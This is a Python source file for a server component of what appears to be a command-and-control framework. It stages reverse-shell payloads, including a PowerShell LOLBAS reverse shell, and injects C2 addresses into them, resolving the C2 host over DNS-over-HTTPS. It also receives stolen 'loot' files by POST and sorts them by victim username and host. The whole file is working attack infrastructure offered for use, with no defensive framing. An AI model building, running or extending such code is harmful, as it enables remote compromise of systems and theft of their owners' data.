"""
A simple threaded HTTP server to serve payloads and tools.
"""

import http.server
import socketserver
import threading
import os
import mimetypes
import ssl
import errno
import re
from datetime import datetime
from core.logger import log
from config import settings
from core.doh_utils import resolve_doh


class ToolServer:
    def __init__(self, context, host='0.0.0.0', port=settings.TOOL_SERVER_PORT):
        self.host = host
        self.port = port
        self.server = None
        self.thread = None
        self.context = context
        # Serve files from a 'tools' directory in the project root
        self.directory = os.path.abspath(os.path.join(
            os.path.dirname(__file__), '..', 'tools'))
        self.payloads_directory = os.path.abspath(
            os.path.join(os.path.dirname(__file__), '..', 'payloads'))
        self.loot_directory = os.path.abspath(os.path.join(
            os.path.dirname(__file__), '..', 'exports', 'loot'))
        self.cert_file = os.path.abspath(
            os.path.join(
                os.path.dirname(__file__),
                '..',
                'database',
                'c2.pem'))
        os.makedirs(self.directory, exist_ok=True)
        os.makedirs(self.loot_directory, exist_ok=True)

    def start(self) -> bool:
        """Starts the HTTPS server in a background thread, retrying on port conflicts."""
        log.info("[ToolServer] start() method entered.")

        if not os.path.exists(self.cert_file):
            log.critical(
                f"[ToolServer] SSL certificate not found at {self.cert_file}. Cannot start HTTPS server.")
            return False

        server_instance = self

        class ToolRequestHandler(http.server.SimpleHTTPRequestHandler):
            def __init__(self, *args, **kwargs):
                super().__init__(*args, directory=server_instance.directory, **kwargs)

            def _authenticate(self) -> bool:
                """Checks for a valid authentication token."""
                auth_header = self.headers.get('X-Auth-Token')
                if auth_header and auth_header == settings.SECRET_KEY:
                    return True
                log.warning(f"Unauthorized request from {self.client_address[0]} - Invalid or missing X-Auth-Token.")
                self.send_error(401, "Unauthorized")
                self.end_headers()
                return False

            def do_GET(self):
                """Handles GET requests, specifically for serving dynamically generated payloads."""
                if not self._authenticate():
                    return

                if self.path.endswith(
                        '/shell.py') or self.path.endswith('/reverse_shell.py'):
                    payload_name = os.path.basename(self.path)
                    try:
                        payload_path = os.path.join(
                            server_instance.payloads_directory, payload_name)
                        with open(payload_path, 'r') as f:
                            payload_content = f.read()

                        c2_host = server_instance.context.get(
                            'c2_public_host', '127.0.0.1')
                        c2_port = server_instance.context.get(
                            'REVERSE_SHELL_PORT', settings.REVERSE_SHELL_PORT)

                        payload_content = payload_content.replace(
                            'C2_HOST = "127.0.0.1"', f'C2_HOST = "{c2_host}"')
                        payload_content = payload_content.replace(
                            'C2_PORT = 4444', f'C2_PORT = {c2_port}')

                        self.send_response(200)
                        self.send_header('Content-type', 'text/plain')
                        self.end_headers()
                        self.wfile.write(payload_content.encode('utf-8'))
                        log.info(
                            f"[ToolServer] Served dynamic payload '{payload_name}' to {self.client_address[0]}")

                    except FileNotFoundError:
                        log.error(
                            f"[ToolServer] Payload file not found: {self.path}")
                        self.send_error(404, "File Not Found")
                    except Exception as e:
                        log.error(
                            f"[ToolServer] Error serving dynamic payload: {e}",
                            exc_info=True)
                        self.send_error(500, "Internal Server Error")
                elif self.path.endswith('/lolbas_rev.ps1'):
                    try:
                        payload_path = os.path.join(server_instance.payloads_directory, 'lolbas_rev.ps1')
                        with open(payload_path, 'r') as f:
                            payload_content = f.read()

                        c2_ip = resolve_doh(settings.C2_HOST)
                        if not c2_ip:
                            log.error(f"[ToolServer] Failed to resolve C2_HOST {settings.C2_HOST} via DoH for lolbas_rev.ps1")
                            self.send_error(500, "C2 resolution failed")
                            return

                        c2_port = settings.REVERSE_SHELL_PORT

                        payload_content = payload_content.replace('{}{C2_IP}', c2_ip)
                        payload_content = payload_content.replace('{}{C2_PORT}', str(c2_port))

                        self.send_response(200)
                        self.send_header('Content-type', 'text/plain')
                        self.end_headers()
                        self.wfile.write(payload_content.encode('utf-8'))
                        log.info(f"[ToolServer] Served dynamic LOLBAS payload to {self.client_address[0]}")

                    except Exception as e:
                        log.error(f"[ToolServer] Error serving LOLBAS payload: {e}", exc_info=True)
                        self.send_error(500, "Internal Server Error")
                else:
                    super().do_GET()

            def do_POST(self):
                """Handles incoming loot via POST requests and saves it to a structured directory."""
                if not self._authenticate():
                    return
                
                try:
                    content_length = int(self.headers['Content-Length'])
                    loot_data = self.rfile.read(content_length)

                    username = self.headers.get('X-Username', 'unknown_user')
                    target_host = self.headers.get(
                        'X-Target-Host', 'unknown_target')
                    original_filename = self.headers.get(
                        'X-Filename', 'unknown_file')

                    safe_username = re.sub(r'[^a-zA-Z0-9_\-]', '', username)
                    safe_target = re.sub(r'[^a-zA-Z0-9_\-.]', '', target_host)
                    safe_filename = os.path.basename(original_filename)
                    timestamp = datetime.now().strftime("%Y%m%d%H%M%S")

                    dir_name = f"{safe_username}_{safe_target}_{timestamp}"
                    loot_dir_path = os.path.join(
                        server_instance.loot_directory, dir_name)
                    os.makedirs(loot_dir_path, exist_ok=True)

                    loot_path = os.path.join(loot_dir_path, safe_filename)

                    with open(loot_path, 'wb') as f:
                        f.write(loot_data)

                    log.success(
                        f"[SUCCESS] Loot Captured! Saved {len(loot_data)} bytes to {loot_path}")

                    self.send_response(200)
                    self.end_headers()
                    self.wfile.write(b'Loot received.')
                except Exception as e:
                    log.error(
                        f"[ToolServer] Error receiving loot: {e}",
                        exc_info=True)
                    self.send_error(500, "Internal Server Error")

        MAX_ATTEMPTS = 10
        initial_port = self.port

        try:
            log.info("[ToolServer] Creating SSL context.")
            context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            context.load_cert_chain(certfile=self.cert_file)
            log.info("[ToolServer] SSL context created successfully.")
        except Exception as e:
            log.critical(
                f"[ToolServer] Failed to create SSL context or load certificate: {e}",
                exc_info=True)
            return False

        for attempt in range(MAX_ATTEMPTS):
            try:
                socketserver.TCPServer.allow_reuse_address = True
                self.server = socketserver.TCPServer(
                    (self.host, self.port), ToolRequestHandler)

                log.info(
                    f"[ToolServer] Wrapping socket with SSL for port {self.port}")
                self.server.socket = context.wrap_socket(
                    self.server.socket, server_side=True)
                log.info(f"[ToolServer] Socket wrapped successfully.")

                log.info(
                    f"[ToolServer] Successfully bound to {self.host}:{self.port} with HTTPS")

                self.thread = threading.Thread(
                    target=self.server.serve_forever, daemon=True)
                self.thread.start()
                return True

            except OSError as e:
                if e.errno == errno.EADDRINUSE:
                    log.warning(
                        f"[ToolServer] Port {self.port} is in use. Trying next port...")
                    self.port += 1
                else:
                    log.critical(
                        f"[ToolServer] An unexpected OS error occurred: {e}",
                        exc_info=True)
                    return False
            except Exception as e:
                log.critical(
                    f"[ToolServer] An unexpected and unhandled exception occurred in start() loop: {e}",
                    exc_info=True)
                return False

        log.critical(
            f"[ToolServer] Could not bind to any port in range {initial_port}-{self.port - 1}. Aborting.")
        return False

    def stop(self):
        """Stops the HTTP server."""
        if self.server:
            self.server.shutdown()
            self.server.server_close()
            print("[ToolServer] Server stopped.")